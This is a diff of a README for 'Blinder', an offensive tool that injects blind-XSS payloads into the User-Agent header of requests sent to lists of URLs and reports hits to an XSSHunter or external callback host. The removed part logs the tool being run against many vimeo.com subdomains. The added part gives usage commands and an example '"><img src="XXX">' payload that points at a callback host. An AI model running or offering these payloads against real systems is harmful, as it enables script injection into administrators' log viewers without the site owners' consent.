@@ -9,43 +9,44 @@ python3 Blinder.py username.xss.ht SubDomains.txt
 ```
 
 ## Description
-- Blinder Is Used To Send Blind-XSS Payloads With HTTP Requests On The User-Agent Header. In Case Some Web Application Is Showing The Logs To The Admin Without HTML Escaping. Blinder Take Two Args With The Run Command First One Should Be Your XSS-Hunter Sub-Domain That Will Sent You The Details If The XSS-Payload Is Fired. You Can Use Your Username Without ```.xss.ht``` If You Added ```-u``` At The End Of The Command For Example ```python3 Blinder.py username Hosts -u```
+- That's a New Version Of Blinder You Can Use To Automate Sending Payloads Into URLs With a Fast Way. It Basicly Uses The Payload You Provide To Send It On The Value Of The *User-Agent* Header To Inject The Payload Into The Server Logs If The Admin Can View It. In This Case You Should Receive An Alert On Your XSSHunter/Bin. That's Just It.
 
-- Blinder Isn't That Fast So It Requires Good Internet Speed. If You Have Any Suggestions To Improve The Tool Speed With The Code. Feel Free To Contact Me Or Make Changes On The Code.
-
-- I Will Update The Tool Soon So You Can Select Any Payload You Want With Other Headers But You Can Always Edit The Code With Whatever You Want To Use On It. Also All Of The Function On The Code Are Separated You Can Simply Import/Copy Them From The Code Into You Code By Removing The External Functions That You Won't Use So You Can Use The Function.
-
-- Blinder Contains Basic Response Code Check. Feel Free To Add Any Response Code On StatusCheck Function With The Desription. And I Would Love To Mergo It Here.
-
-- While Running Blinder. You Shouldn't Put Some Arg Before The Otherone. Or Put Args On Wrong Places. Blinder Is Using SYS To Get The Args Accroding To The Index Number. So You Should Use It Like This ```python3 {XSSHunter} {URLs-File} {MODE}``` For Example If You Put The MODE Before The URLs-File You WIll Get An Error Since The Programs Will Got That The MODE Is The File It Should Open.
-
-### Output 
+### Installation
 ```
-root@MohammedDief:~/Programing/PythonProjects/Blinder$ python3 Blinder.py {username}.xss.ht vimeo.com.robe 
-Internal Server Error, Maybe From The User-agent, Check That. Url: https://dev.starlord.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435600.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435592.cloud.vimeo.com
-Internal Server Error, Maybe From The User-agent, Check That. Url: http://dev.starlord.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435583.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435600.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435592.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435583.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512476430.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512476432.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435595.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512476430.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512476432.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435595.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435596.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435596.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435594.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://1512435594.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://magic.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://magic.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://live-api.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://i.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: http://live-api.cloud.vimeo.com
-Not Found Resource. But Seems The XSSPayload Got There, Url: https://1512435597.cloud.vimeo.com
-^C
-Exit.
+git clone https://github.com/DEMON1A/Blinder
+cd Blinder
+python3 Blinder.py [ARGS]
 ```
+
+### What's New?
+- Threading To Improve The Script Speed.
+- Using Your Own External Bin Instead Of Just Using XSSHunter
+- Using Your Own Payloads That Could Be Used To Inject Other Payloads For Other Issues
+- Been Able To Allow/Disallow Redirects With Requests
+- Cleaner Code!
+
+### How To Use:
+- For Basic Usage With a Basic Payload You Can Just The Script Using This:
+
+```
+python3 Blinder.py -f URLs.txt -u hacker -r allow
+```
+
+- The Script Can't Run Without Getting The Redirection Rule. You Can Select Between `allow` and `deny` That Chooses If The Redirections Will Be Followed In This Case Or Not.
+
+- To Add Your Own Payload You Have To Use `XXX` On Your Payload So It Could Be Replaced With The XSSHunter/ExternalBin. For Example If You Want To Create Your Own Payload It Will Look Like This:
+
+```
+python3 Blinder.py -f URLs.txt -u hacker -r allow -p '"><img src="XXX">'
+```
+
+- Make Sure The `XXX` In This Case Are Able In a Upper Case.
+
+- To Use Your Own ExternalBin Instead Of XSSHunter You Have To Use `-b` Option. With Your External Host Including The Protocol. For Example
+
+```
+python3 Blinder.py -f URLs.txt -b https://www.example.com/ -r allow -p '"><img src="XXX">'
+```
+
+### Something Isn't Working Or You Want To Improve Something?
+- Then Please Open an Issue With It Or You Can Fork The Project Then Create a Pull Request.
